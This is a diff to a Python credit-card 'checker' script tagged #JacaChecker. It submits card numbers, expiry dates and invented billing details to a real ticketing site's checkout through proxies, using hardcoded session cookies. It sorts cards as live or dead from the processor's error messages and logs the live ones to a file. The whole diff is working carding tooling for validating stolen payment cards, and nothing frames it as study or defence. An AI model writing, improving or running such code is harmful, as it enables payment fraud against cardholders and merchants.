@@ -183,71 +183,73 @@ def checker(card, month, year, cvv):
 
  
  
- 
-            url = "https://www.brownpapertickets.com/checkout.html"
-            payload = f'payment_method=&final=1&browserinfo=24.false.1080.1920&attendee_fname=james&attendee_lname=desn&email=suor_jose2daislv%40gmail.com&phone=6612147345&terms=t&billing_fname=james&billing_lname=dean&billing_address=23937%20Rancho%20Ct&billing_address_2=&billing_city=Valencia&billing_state=CA&billing_province=&billing_zip=91354&billing_country=United%20States&type=Visa&number={card}&code=222&expiry_month={month}&expiry_year={year}&issue_month=&issue_year=&issue_number='
-            headers = {
-                'Host': 'www.brownpapertickets.com',
-                'Cache-Control': 'max-age=0',
-                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'Upgrade-Insecure-Requests': '1',
-                'Origin': 'https://www.brownpapertickets.com',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-User': '?1',
-                'Sec-Fetch-Dest': 'document',
-                'Referer': 'https://www.brownpapertickets.com/checkout.html',
-                'Accept-Language': 'pt-PT,pt;q=0.9',
-                'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; bpt={bpt}; client_secure={client_secure}; _gat_UA-114148720-1=1; _ga=GA1.1.1494828109.1712786777; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790502.43.0.0; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790542.0.0.0',
-                'Content-Type': 'application/x-www-form-urlencoded'
-                }
-            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
-            if "Redirection" in response.text:
-                raise RequisicaoException()
-            
-            
-            
-        
-
-
-
-
+            try:
+                url = "https://www.brownpapertickets.com/checkout.html"
+                payload = f'payment_method=&final=1&browserinfo=24.false.1080.1920&attendee_fname=james&attendee_lname=desn&email=suor_jose2daislv%40gmail.com&phone=6612147345&terms=t&billing_fname=james&billing_lname=dean&billing_address=23937%20Rancho%20Ct&billing_address_2=&billing_city=Valencia&billing_state=CA&billing_province=&billing_zip=91354&billing_country=United%20States&type=Visa&number={card}&code=222&expiry_month={month}&expiry_year={year}&issue_month=&issue_year=&issue_number='
+                headers = {
+                    'Host': 'www.brownpapertickets.com',
+                    'Cache-Control': 'max-age=0',
+                    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'Upgrade-Insecure-Requests': '1',
+                    'Origin': 'https://www.brownpapertickets.com',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'navigate',
+                    'Sec-Fetch-User': '?1',
+                    'Sec-Fetch-Dest': 'document',
+                    'Referer': 'https://www.brownpapertickets.com/checkout.html',
+                    'Accept-Language': 'pt-PT,pt;q=0.9',
+                    'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; bpt={bpt}; client_secure={client_secure}; _gat_UA-114148720-1=1; _ga=GA1.1.1494828109.1712786777; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790502.43.0.0; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790542.0.0.0',
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
+                if "Redirection" in response.text:
+                    raise RequisicaoException()
                 
+                
+                
+            
+    
+    
+    
+    
                     
-            if 'Invalid transaction' in response.text:
-                #code = response.json()['issuerResponseDetails']['issuerResponseCode']
-                bin = api_bin(card[:6])              
-                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19"                          
-                open("brownpapertickets.txt", "a").write(f"{card} {month} {year} {cvv} {bin} Retry 19 #JacaChecker\n") 
-                print(Fore.GREEN + f"{x} #JacaChecker")  
-                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}    
-                
-            elif 'Insufficient funds' in response.text:
-                bin = api_bin(card[:6])              
-                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF"                          
-                open("brownpapertickets.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF #JacaChecker\n") 
-                print(Fore.GREEN + f"{x} #JacaChecker")  
-                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
-                
-
+                        
+                if 'Invalid transaction' in response.text:
+                    #code = response.json()['issuerResponseDetails']['issuerResponseCode']
+                    bin = api_bin(card[:6])              
+                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19"                          
+                    open("brownpapertickets.txt", "a").write(f"{card} {month} {year} {cvv} {bin} Retry 19 #JacaChecker\n") 
+                    print(Fore.GREEN + f"{x} #JacaChecker")  
+                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}    
                     
-            elif 'The error returned by the credit card processor was' in response.text:
-                response = pegarItem(response.text, 'The error returned by the credit card processor was:<BR><BR><CENTER>','</CENTER><BR><BR>')
-                bin = api_bin(card[:6])
-                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response}"     
-                print(Fore.RED + f"{x} #JacaChecker")  
-                return {"code": 1, "mensagem": f"{x} #JacaChecker<br>"}                        
-
-            else:
-            # print(Fore.LIGHTBLACK_EX + f"RETESTANDO: {x} #JacaChecker")    
-                print(Fore.RED + 'Gateway Timeout' )
-                return {"code": 1, "mensagem": "Gateway Timeout #JacaChecker<br>"} 
-
-
+                elif 'Insufficient funds' in response.text:
+                    bin = api_bin(card[:6])              
+                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF"                          
+                    open("brownpapertickets.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF #JacaChecker\n") 
+                    print(Fore.GREEN + f"{x} #JacaChecker")  
+                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
+                    
+    
+                        
+                elif 'The error returned by the credit card processor was' in response.text:
+                    response = pegarItem(response.text, 'The error returned by the credit card processor was:<BR><BR><CENTER>','</CENTER><BR><BR>')
+                    bin = api_bin(card[:6])
+                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response}"     
+                    print(Fore.RED + f"{x} #JacaChecker")  
+                    return {"code": 1, "mensagem": f"{x} #JacaChecker<br>"}                        
+    
+                else:
+                # print(Fore.LIGHTBLACK_EX + f"RETESTANDO: {x} #JacaChecker")    
+                    print(Fore.RED + 'Gateway Timeout' )
+                    return {"code": 1, "mensagem": "Gateway Timeout #JacaChecker<br>"} 
+    
+            except:
+                    print(Fore.LIGHTWHITE_EX + f"RETESTANDO 302: {card}|{month}|{year}|{cvv}")
+                    reteste(card, month, year, cvv)
                         
         except requests.exceptions.ProxyError:
             print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
@@ -261,10 +263,10 @@ def checker(card, month, year, cvv):
             print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
             reteste(card, month, year, cvv)
             
-        except RequisicaoException:
-            time.sleep(15)
-            print(Fore.LIGHTWHITE_EX + f"RETESTANDO 302: {card}|{month}|{year}|{cvv}")
-            reteste(card, month, year, cvv)
+        # except RequisicaoException:
+        #     time.sleep(15)
+        #     print(Fore.LIGHTWHITE_EX + f"RETESTANDO 302: {card}|{month}|{year}|{cvv}")
+        #     reteste(card, month, year, cvv)
 
 
 def processar_cartoes(card,mes,ano,cvv):
